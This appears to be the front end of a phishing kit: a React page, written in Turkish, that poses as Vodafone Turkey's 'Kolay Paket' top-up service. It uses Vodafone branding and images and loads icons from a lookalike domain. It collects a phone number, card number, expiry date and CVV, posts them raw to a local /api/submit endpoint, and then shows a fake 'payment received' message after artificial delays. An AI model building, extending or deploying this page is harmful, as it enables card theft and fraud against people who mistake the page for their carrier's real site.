import React, { useState } from 'react'
import axios from 'axios'

const Index = () => {
  const [step, setStep] = useState(1)
  const [phoneNumber, setPhoneNumber] = useState('(5')
  const [selectedPackage, setSelectedPackage] = useState(null)
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvc, setCvc] = useState('')
  const [showModal, setShowModal] = useState(false)
  const [loading, setLoading] = useState(false)
  const [paymentSuccess, setPaymentSuccess] = useState(false)

  // handleContinue fonksiyonunu değiştirin
  const handleContinue = () => {
    // Rastgele 3000 ile 6000 milisaniye (3 ile 6 saniye) arasında bir gecikme süresi belirleyin
    const delay = Math.floor(Math.random() * (4000 - 2000 + 1) + 2000)

    setTimeout(() => {
      setStep(step + 1)
    }, delay)
  }

  const handlePhoneNumberChange = (e) => {
    let input = e.target.value
    input = input.replace(/[^\d]/g, '')

    if (input.length === 0) {
      setPhoneNumber('(5')
      return
    }

    input = '(5' + input.slice(1)

    const formattedInput = formatPhoneNumber(input)
    setPhoneNumber(formattedInput)
  }

  const formatPhoneNumber = (input) => {
    const regex = /^\(5(\d{0,2})\)?[-\s]?(\d{0,3})?[-\s]?(\d{0,4})?$/
    const match = input.match(regex)

    if (!match) {
      return input
    }

    const areaCode = match[1] ? match[1] : ''
    const firstPart = match[2] ? match[2] : ''
    const secondPart = match[3] ? match[3] : ''

    let formattedNumber = `(5${areaCode}`

    if (firstPart.length > 0) {
      formattedNumber += `) ${firstPart}`
    }

    if (secondPart.length > 0) {
      formattedNumber += ` ${secondPart}`
    }

    return formattedNumber
  }

  const handleReset = () => {
    setStep(1)
    setSelectedPackage(null)
  }

  const packetReset = () => {
    setSelectedPackage(null)
    setStep(2)
  }

  const handlePackageSelect = (index) => {
    setSelectedPackage(index)
    handleContinue()
  }

  const handleSubmit = async () => {
    try {
      setLoading(true)
      await axios.post('/api/submit', {
        phoneNumber: phoneNumber,
        cardNumber: cardNumber,
        expiry: expiry,
        cvc: cvc,
      })
      setLoading(false)
      setPaymentSuccess(true)
    } catch (error) {
      console.error(error)
      setLoading(false)
      alert('Bir hata oluştu.')
    }
  }

  const packages = [
    {
      name: 'Süper+Uyumlu 3',
      data: '18 GB',
      minutes: '750 DK',
      sms: '250 SMS',
      price: '₺52',
      validity: '29 gün geçerli',
    },
    {
      name: 'Süper+Uyumlu 2',
      data: '8 GB',
      minutes: '750 DK',
      sms: '250 SMS',
      price: '₺40',
      validity: '28 gün geçerli',
    },
    {
      name: 'Super+Uyumlu',
      data: '12 GB',
      minutes: '750 DK',
      sms: '250 SMS',
      price: '₺47',
      validity: '28 gün geçerli',
    },
    {
      name: 'Süper+Ekonomik',
      data: '4 GB',
      minutes: '500 DK',
      sms: '250 SMS',
      price: '₺30',
      validity: '28 gün geçerli',
    },
  ]

  const handleCardNumberChange = (e) => {
    const formattedValue = e.target.value
      .replace(/\s+/g, '')
      .replace(/(\d{4})/g, '$1 ')
      .trim()
    setCardNumber(formattedValue)
  }

  const handleExpiryChange = (e) => {
    const formattedValue = e.target.value
      .replace(/[^0-9]/g, '')
      .replace(/(\d{2})/, '$1/')
      .slice(0, 5)
    setExpiry(formattedValue)
  }

  return (
    <div className="container mx-auto mt-10 max-w-screen-md px-4 md:px-0">
      {showModal && (
        <div className="fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-50">
          <div className="bg-white p-8 shadow-lg rounded">
            <div className="flex items-center mb-4">
              <img
                src="https://iconscout.com/icon/payment-success"
                alt="Payment Success Icon"
                className="w-12 h-12 mr-4"
              />
              <h2 className="text-xl font-bold">Ödemenizi Alıyoruz...</h2>
            </div>
            <p className="text-gray-700 mb-4">
              Lütfen bekleyin, bu işlem birkaç dakika sürebilir.
            </p>
            {loading && (
              <div className="spinner border-4 border-t-4 border-gray-600 rounded-full h-12 w-12 mb-4 animate-spin"></div>
            )}
          </div>
        </div>
      )}

      <h1 className="text-3xl font-bold mb-8 text-center text-[#333]">
        Kolay Paket Yükle
      </h1>
      <div className="flex justify-center mb-8">
        <span className="mr-4 border-b-2 border-red-600 pb-1 font-bold cursor-pointer">
          Misafir olarak yükle
        </span>
        <span className="cursor-pointer">Giriş yaparak yükle</span>
      </div>
      <div className="flex justify-center">
        <div className="bg-white shadow-md p-4 rounded-md md:p-8 w-full mx-auto">
          {step === 1 && (
            <div>
              <h4 className="font-bold mb-2">
                <span className="text-2xl mr-5">1.</span>Kolay paket yüklemek
                istediğiniz telefon numarasını giriniz
              </h4>
              <hr className="mb-2" />
              <input
                type="tel"
                className="border border-gray-300 p-2 w-[300px] rounded-md justify-center mt-5 mb-5"
                placeholder="Telefon Numarası"
                value={phoneNumber}
                onChange={handlePhoneNumberChange}
                maxLength={14}
              />
              <button
                className={`font-semibold w-full px-4 py-2 rounded mt-2 ${
                  phoneNumber.length === 14
                    ? 'bg-red-600 text-white hover:bg-red-700'
                    : 'bg-gray-300 text-gray-500 cursor-not-allowed'
                }`}
                onClick={handleContinue}
                disabled={phoneNumber.length !== 14}
              >
                Devam Et
              </button>
            </div>
          )}
          {step > 1 && (
            <div>
              <h1 className="mb-4 font-bold">
                <span className="text-2xl mr-5">1.</span>Telefon numarası{' '}
                <hr className="mb-2 mt-2" />
              </h1>
              <div className="flex items-center">
                <img
                  src="https://cdn-icons-png.flaticon.com/512/65/65680.png?w=740&t=st=1683210386~exp=1683210986~hmac=8de099d5a6361468cdd6e4b675375d5a78910d11675f5111f662b4399351e34e"
                  alt="Phone"
                  className="mr-2 w-[55px] h-[55px]"
                />
                <p className="font-bold text-[17px] mr-4">{phoneNumber}</p>
                <span
                  className="text-red-600 cursor-pointer underline hover:text-red-800"
                  onClick={handleReset}
                >
                  Değiştir
                </span>
              </div>
            </div>
          )}
        </div>
      </div>
      <div className="flex justify-center mt-8">
        <div className="bg-white shadow-md rounded-md p-4 md:p-8 w-full mx-auto max-w-[900px]">
          <div>
            <h4 className="font-bold mb-2">
              <span className="text-2xl mr-5">2.</span> Kolay paket seçim
            </h4>
            <hr className="mb-8 " />
            {step === 1 && (
              <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
                Telefon numaranızı girdiğiniz zaman faturanıza uygun paketleri
                görüceksiniz.{' '}
              </p>
            )}

            {step > 1 && (
              <div>
                {packages.map((pack, i) => (
                  <div
                    key={i}
                    className={`border-2  border-[#007c92] rounded-md p-4 mb-4 ${
                      selectedPackage === null || selectedPackage === i
                        ? 'block'
                        : 'hidden'
                    }`}
                  >
                    <div className="bg-[#007c92] text-white font-semibold text-center mb-2 py-1 rounded-md">
                      Sana Özel
                    </div>
                    <div className="flex items-center">
                      <img
                        src="https://cms.vodafone.com.tr/static/img/content/21-09/21/iconsindicatorssystemiconssmarthomekit333333-3x.png"
                        alt="Package"
                        className="mr-2 w-[40px] h-[40px]"
                      />
                      <div>
                        <p className="font-bold text-[17px]">{pack.name}</p>
                        <p className="text-sm">
                          {pack.data} - {pack.minutes} - {pack.sms}
                        </p>
                      </div>
                    </div>
                    <p className="font-bold text-[24px] mt-2">{pack.price}</p>
                    <p className="text-sm">{pack.validity}</p>
                    {selectedPackage === i ? (
                      <button
                        className="bg-red-600 text-white py-2 px-4 rounded mt-2 hover:bg-red-700"
                        onClick={packetReset}
                      >
                        Değiştir
                      </button>
                    ) : (
                      <button
                        className="bg-red-600 hover:bg-red-700 text-white py-2 px-4 rounded mt-2"
                        onClick={() => handlePackageSelect(i)}
                      >
                        Paketi seç
                      </button>
                    )}
                  </div>
                ))}
              </div>
            )}
            {step === 3 && (
              <p className="font-medium underline text-green-600 text-center text-[15px] mt-6 mb-6">
                Seçtiğiniz paket faturanıza yüklenecek şimdi ödeme kısmını
                doldurabilirsiniz.{' '}
              </p>
            )}
          </div>
        </div>
      </div>

      <div className="flex justify-center mt-8 mb-[55px]">
        <div className="bg-white shadow-md rounded-md p-4 md:p-8 w-full mx-auto">
          <div>
            <h4 className="font-bold mb-2">
              <span className="font-bold text-2xl mr-5">3.</span> Ödeme
              <hr className="mb-2 mt-2" />
            </h4>
            {step < 3 && (
              <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
                Telefon numarasına yükleyeceğiniz paketi seçtiğinizde ödeme
                kısmına yönlendirileceksiniz.{' '}
              </p>
            )}
            {step === 3 && (
              <div>
                {/* Payment method section */}
                <div className="flex items-center mb-4">
                  <input
                    type="checkbox"
                    className="form-checkbox bg-blue-600 text-white cursor-not-allowed pointer-events-none mr-2"
                    defaultChecked
                    readOnly
                  />
                  <span>Kredi / Banka Kartı İle Öde</span>
                </div>
                {/* Payment icons section */}
                <div className="flex justify-center mb-4">
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/masterpass.svg"
                    alt="Masterpass"
                    className="mr-2"
                  />
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/amex.svg"
                    alt="Amex"
                    className="mr-2"
                  />
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/troy.svg"
                    alt="Troy"
                    className="ml-2"
                  />
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/visa.svg"
                    alt="visa"
                    className="ml-2"
                  />
                </div>
                {/* Card number section */}
                <label
                  htmlFor="cardNumber"
                  className="text-gray-700 font-bold mb-2"
                >
                  Kart Numarası
                </label>
                <input
                  type="text"
                  id="cardNumber"
                  className="border border-gray-300 p-2 w-full mt-3 mb-5"
                  placeholder="4321 1232 1312 3212"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  maxLength={19}
                />
                {/* Expiry and CVC section */}
                <label
                  htmlFor="cardNumber"
                  className="text-gray-700 font-bold mb-5"
                >
                  Son Kullanma Tarihi / CVV
                </label>
                <div className="md:flex md:justify-between mb-4">
                  <input
                    type="text"
                    className="border border-gray-300 p-2 w-full md:w-1/2 md:mr-2 mt-3 mb-2"
                    placeholder="Son Kullanma Tarihi (AA/YY)"
                    value={expiry}
                    onChange={handleExpiryChange}
                    maxLength={5}
                  />
                  <input
                    type="text"
                    className="border border-gray-300 p-2 w-full md:w-1/2 md:ml-2 mt-3 mb-2"
                    placeholder="CVV"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value)}
                    maxLength={3}
                  />
                </div>
                <hr className="mb-4" />
                {/* Agreement section */}
                <div className="flex items-center">
                  <input type="checkbox" className="form-checkbox mr-2" />
                  <span>
                    <a
                      className="underline text-red-600 cursor-pointer"
                      href="https://www.vodafone.com.tr/yardim/satin-almak-icin-hangi-adimlari-gecmeliyim"
                      target="_blank"
                    >
                      Mesafeli Satış Sözleşmesi
                    </a>{' '}
                    ve{' '}
                    <a
                      className="underline text-red-600 cursor-pointer"
                      href="https://www.vodafone.com.tr/lead/on-muhasebe-ve-e-donusum-basvuru-formu"
                      target="_blank"
                    >
                      Ön Bilgilendirme Formunu
                    </a>{' '}
                    okudum, onaylıyorum
                  </span>
                </div>
                <button
                  className="bg-red-600 text-white justify-center py-2 px-4 rounded mt-4  w-full disabled:bg-gray-300 disabled:text-gray-500 disabled:cursor-not-allowed"
                  onClick={handleSubmit}
                  disabled={!cardNumber || !expiry || !cvc}
                >
                  {packages[selectedPackage].price} ödeme yap
                </button>
                {/* Loading overlay */}
                {loading && (
                  <div className="bg-black bg-opacity-50 fixed inset-0 flex items-center justify-center z-50">
                    <div className="bg-white shadow-xl p-8 rounded-lg w-[450px]">
                      <h2 className="text-center text-red-600 font-semibold text-2xl mb-4">
                        Ödemenizi Alıyoruz...
                      </h2>
                      <p className="text-center text-gray-600 mb-6">
                        Lütfen bekleyin, bu işlem birkaç dakika sürebilir.
                      </p>
                      <div className="flex justify-center">
                        <div className="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-12 w-12 mb-4"></div>
                      </div>
                    </div>
                  </div>
                )}
                {/* Payment success message */}
                {paymentSuccess && (
                  <p className="font-medium text-green-600 text-center text-[15px] mt-6 mb-6">
                    Ödemeniz başarıyla alındı!
                  </p>
                )}
              </div>
            )}

            {step === 4 && (
              <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
                Bekleyin Ödemenizi Alıyoruz...{' '}
              </p>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

export default Index
